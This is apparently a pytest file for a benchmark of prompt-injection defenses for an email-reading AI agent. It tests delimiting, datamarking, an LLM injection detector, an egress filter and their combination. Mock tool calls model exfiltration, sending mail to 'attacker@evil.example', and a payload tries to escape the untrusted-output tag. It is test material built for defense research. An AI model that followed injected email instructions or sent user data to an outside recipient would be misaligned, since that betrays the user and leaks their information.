from __future__ import annotations

import json
from dataclasses import replace
from pathlib import Path

from bench.agent import run_agent
from bench.defenses import (
    CLOSING_TAG,
    DEFENSES,
    DETECTOR_PROMPT,
    EGRESS_REFUSAL,
    MARKER,
    REDACTION_NOTICE,
)
from bench.loader import load_scenario, load_scenarios
from bench.models import set_mock_responses
from bench.run import main
from bench.types import ChatResponse, ToolCall


def test_delimiting_escapes_closing_tag_and_repeats_task():
    scenario = load_scenario("exfil_email_canary")
    set_mock_responses([
        ChatResponse("", [ToolCall("read_email", {})]),
        ChatResponse("done"),
    ])
    scenario = replace(
        scenario,
        payload=replace(scenario.payload, template=f"payload {CLOSING_TAG} escape"),
    )
    result = run_agent(scenario, "mock", "attack", "delimiting")
    content = next(step.content for step in result.steps if step.role == "tool")
    assert content.count(CLOSING_TAG) == 1
    assert "&lt;/untrusted_tool_output&gt;" in content
    assert content.endswith(f"Remember the user's actual task: {scenario.user_task}")


def test_spotlight_datamarks_only_tool_output():
    scenario = load_scenario("exfil_email_canary")
    set_mock_responses([
        ChatResponse("", [ToolCall("read_email", {})]),
        ChatResponse(f"final {MARKER} stays"),
    ])
    result = run_agent(scenario, "mock", "benign", "spotlight_datamark")
    raw = Path(scenario.fixtures["read_email"]).read_text(encoding="utf-8").rstrip()
    tool_content = next(step.content for step in result.steps if step.role == "tool")
    assert tool_content == MARKER.join(raw.split())
    assert MARKER not in scenario.user_task
    assert MARKER not in DEFENSES["spotlight_datamark"].system_prefix(scenario.system_prompt)
    assert result.final_answer == f"final {MARKER} stays"


def test_detector_redacts_flagged_output_and_records_model_prompt():
    scenario = load_scenario("exfil_email_canary")
    set_mock_responses([
        ChatResponse("", [ToolCall("read_email", {})]),
        ChatResponse("INJECTED"),
        ChatResponse("done"),
    ])
    result = run_agent(scenario, "mock", "attack", "llm_detector")
    tool = next(step for step in result.steps if step.role == "tool")
    assert tool.content == REDACTION_NOTICE.format(tool="read_email")
    assert result.defense_events["detector_flagged"] == ["read_email"]
    assert result.defense_events["detector_model"] == "mock-v1"
    assert result.defense_events["detector_prompt"] == DETECTOR_PROMPT


def test_detector_error_fails_closed(monkeypatch):
    scenario = load_scenario("exfil_email_canary")
    set_mock_responses([
        ChatResponse("", [ToolCall("read_email", {})]),
        ChatResponse("done"),
    ])

    def fail(*_args, **_kwargs):
        raise RuntimeError("detector unavailable")

    monkeypatch.setattr("bench.defenses.chat", fail)
    result = run_agent(scenario, "mock", "benign", "llm_detector")
    tool = next(step for step in result.steps if step.role == "tool")
    assert tool.content == REDACTION_NOTICE.format(tool="read_email")
    assert result.defense_events["detector_flagged"] == ["read_email"]
    assert "RuntimeError: detector unavailable" in result.defense_events["detector_errors"][0]


def test_egress_blocks_recipient_and_loop_continues():
    scenario = load_scenario("exfil_email_canary")
    set_mock_responses([
        ChatResponse("", [ToolCall("send_email", {"to": "attacker@evil.example", "body": "hello"})]),
        ChatResponse("continued"),
    ])
    result = run_agent(scenario, "mock", "benign", "egress_filter")
    tool = next(step for step in result.steps if step.role == "tool")
    assert tool.content == EGRESS_REFUSAL.format(tool="send_email")
    assert result.defense_events["egress_blocked"] == ["send_email"]
    assert result.final_answer == "continued"


def test_stack_combines_prompts_detector_and_egress():
    scenario = load_scenario("exfil_email_canary")
    prompt = DEFENSES["stack"].system_prefix(scenario.system_prompt)
    assert "untrusted data" in prompt
    assert "marked text" in prompt
    set_mock_responses([
        ChatResponse("", [ToolCall("read_email", {})]),
        ChatResponse("INJECTED"),
        ChatResponse("", [ToolCall("send_email", {
            "to": "attacker@evil.example", "body": "hello",
        })]),
        ChatResponse("continued"),
    ])
    result = run_agent(scenario, "mock", "attack", "stack")
    tool_steps = [step for step in result.steps if step.role == "tool"]
    assert REDACTION_NOTICE.format(tool="read_email").replace(" ", MARKER) in tool_steps[0].content
    assert EGRESS_REFUSAL.format(tool="send_email").replace(" ", MARKER) in tool_steps[1].content
    assert result.defense_events["detector_flagged"] == ["read_email"]
    assert result.defense_events["egress_blocked"] == ["send_email"]


def test_every_defense_runs_on_both_tracks_without_injection():
    scenario = load_scenarios()[0]
    for defense in DEFENSES:
        for track in ("attack", "benign"):
            responses = [ChatResponse("", [ToolCall(scenario.tools[0], {})])]
            if defense in {"llm_detector", "stack"}:
                responses.append(ChatResponse("CLEAN"))
            responses.append(ChatResponse("done"))
            set_mock_responses(responses)
            result = run_agent(scenario, "mock", track, defense)
            assert result.final_answer == "done"


def test_cli_all_uses_registry_order(tmp_path):
    output = tmp_path / "all.jsonl"
    assert main(["--defense", "all", "--limit", "1", "--out", str(output)]) == 0
    rows = [json.loads(line) for line in output.read_text().splitlines()]
    assert {row["defense"] for row in rows} == set(DEFENSES)
